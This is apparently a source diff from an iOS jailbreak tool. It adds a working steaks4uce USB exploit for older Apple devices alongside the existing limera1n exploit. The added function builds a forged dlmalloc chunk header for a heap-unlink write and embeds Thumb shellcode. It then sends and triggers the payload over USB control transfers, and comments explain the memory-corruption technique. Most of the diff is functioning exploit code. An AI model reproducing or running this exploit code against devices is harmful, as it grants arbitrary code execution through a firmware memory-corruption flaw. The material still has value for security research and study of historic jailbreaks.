@@ -6,8 +6,10 @@
 #include "libpartial.h"
 #include "libirecovery.h"
 
-#include "exploit.h"
+//#include "exploit.h"
 #include "ramdisk.h"
+#include "limera1n.h"
+#include "steaks4uce.h"
 #include "payloads/iBSS.k66ap.h"
 #include "payloads/iBSS.k48ap.h"
 #include "payloads/iBSS.n88ap.h"
@@ -308,7 +310,95 @@ int upload_firmware_payload(char* type) {
 	return 0;
 }
 
-int upload_exploit() {
+int steaks4uce_exploit() {
+	int i, ret;
+	unsigned char data[0x800];
+	unsigned char status[6];
+	unsigned char payload[] = {
+				/* free'd buffer dlmalloc header: */
+				0x84, 0x00, 0x00, 0x00, // 0x00: previous_chunk
+				0x05, 0x00, 0x00, 0x00, // 0x04: next_chunk
+				/* free'd buffer contents: (malloc'd size=0x1C, real size=0x20, see sub_9C8) */
+				0x80, 0x00, 0x00, 0x00, // 0x08: (0x00) direction
+				0x80, 0x62, 0x02, 0x22, // 0x0c: (0x04) usb_response_buffer
+				0xff, 0xff, 0xff, 0xff, // 0x10: (0x08)
+				0x00, 0x00, 0x00, 0x00, // 0x14: (0x0c) data size (filled by the code just after)
+				0x00, 0x01, 0x00, 0x00, // 0x18: (0x10)
+				0x00, 0x00, 0x00, 0x00, // 0x1c: (0x14)
+				0x00, 0x00, 0x00, 0x00, // 0x20: (0x18)
+				0x00, 0x00, 0x00, 0x00, // 0x24: (0x1c)
+				/* attack dlmalloc header: */
+				0x15, 0x00, 0x00, 0x00, // 0x28: previous_chunk
+				0x02, 0x00, 0x00, 0x00, // 0x2c: next_chunk : 0x2 choosed randomly :-)
+				0x01, 0x30, 0x02, 0x22, // 0x30: FD : shellcode_thumb_start()
+				//0x90, 0xd7, 0x02, 0x22, // 0x34: BK : free() LR in stack
+				0xfc, 0xd7, 0x02, 0x22, // 0x34: BK : exception_irq() LR in stack
+				};
+	// attack explanation :
+	// when free() is called, the chunk unlink code will do:
+	//
+	//    FD[0xc] = BK
+	//    BK[0x0] = FD
+	//
+
+	unsigned char shellcode_thumb_start[] = {
+				0x06, 0xe0,		// B shellcode_thumb
+				0x00, 0x00,		// NOP
+				0x00, 0x00,		// NOP
+				0x00, 0x00,		// NOP
+				0x00, 0x00,		// NOP
+				0x00, 0x00,		// NOP
+				0x00, 0x00, 0x00, 0x00,	// this will be overwritten by BK
+				};
+
+	unsigned char shellcode_thumb[] = {
+				0x00, 0x20,		// MOVS	R0, #0
+				0x03, 0x49,		// LDR	R1, =0x22023000
+				0x00, 0x22,		// MOVS	R2, #0xDEAD
+				0x03, 0x4B,		// LDR	R3, =0x3339
+				0x98, 0x47,		// BLX	R3			; calls sub_3338 (jump_to)
+				0x90, 0xbd,		// POP  {R4,R7,PC}
+				0x00, 0x00,		// NOP
+				0x00, 0x00,		// NOP
+				0x00, 0x00, 0x00, 0x00,
+				0x39, 0x33, 0x00, 0x00,
+				};
+
+	int send_size = 0x100 + sizeof(payload);
+
+	payload[0x14] = send_size & 0xff;
+	payload[0x15] = (send_size >> 8) & 0xff;
+	payload[0x16] = (send_size >> 16) & 0xff;
+	payload[0x17] = (send_size >> 24) & 0xff;
+
+	memset(data, 0, 0x800);
+	memcpy(data, shellcode_thumb_start, sizeof(shellcode_thumb_start));
+	memcpy(&data[sizeof(shellcode_thumb_start)], shellcode_thumb, sizeof(shellcode_thumb));
+	memcpy(&data[0x100], payload, sizeof(payload));
+
+	for(i = 0; i < 46; i++) irecv_control_transfer(client, 0x21, 1, 0, 0, data, send_size, 1000);
+
+	debug("Sending exploit payload\n");
+	irecv_hexdump(data, send_size, 0);
+
+	ret = irecv_control_transfer(client, 0x21, 1, 0, 0, data, send_size , 1000);
+	if (ret < 0) {
+		error("Unable to send payload exploit\n");
+		return -1;
+	}
+
+	debug("Executing exploit payload\n");
+	ret = irecv_control_transfer(client, 0xA1, 1, 0, 0, data, send_size , 1000);
+	if (ret < 0) {
+		error("Unable to execute exploit payload\n");
+		return -1;
+	}
+	debug("Payload sent & executed successfully.\n");
+
+	return 0;
+}
+
+int limera1n_exploit() {
 	irecv_error_t error = 0;
 	unsigned int i = 0;
 	unsigned char buf[0x800];
@@ -318,6 +408,7 @@ int upload_exploit() {
 	unsigned int stack_address = 0x84033F98;
 	unsigned int shellcode_address = 0x84023001;
 	unsigned int shellcode_length = 0;
+
 
 	if (device->chip_id == 8930) {
 		max_size = 0x2C000;
@@ -331,8 +422,8 @@ int upload_exploit() {
 	}
 
 	memset(shellcode, 0x0, 0x800);
-	shellcode_length = sizeof(exploit);
-	memcpy(shellcode, exploit, sizeof(exploit));
+	shellcode_length = sizeof(limera1n);
+	memcpy(shellcode, limera1n, sizeof(limera1n));
 	
 	debug("Resetting device counters\n");
 	error = irecv_reset_counters(client);
@@ -740,7 +831,10 @@ int pois0n_is_compatible() {
 	}
 	info("Identified device as %s\n", device->product);
 
-	if (device->chip_id != 8930 && device->chip_id != 8922 && device->chip_id != 8920) {
+	if (device->chip_id != 8930 &&
+			device->chip_id != 8922 &&
+			device->chip_id != 8920 &&
+			device->chip_id != 8720) {
 		error("Sorry device is not compatible with this jailbreak\n");
 		return -1;
 	}
@@ -757,10 +851,18 @@ void pois0n_exit() {
 int pois0n_inject() {
 	//////////////////////////////////////
 	// Send exploit
-	debug("Preparing to upload exploit data\n");
-	if(upload_exploit() < 0) {
-		error("Unable to upload exploit data\n");
-		return -1;
+	if(device->chip_id == 8720) {
+		debug("Preparing to upload steaks4uce exploit\n");
+		if(steaks4uce_exploit() < 0) {
+			error("Unable to upload exploit data\n");
+			return -1;
+		}
+	} else {
+		debug("Preparing to upload limera1n exploit\n");
+		if(limera1n_exploit() < 0) {
+			error("Unable to upload exploit data\n");
+			return -1;
+		}
 	}
 
 	//////////////////////////////////////
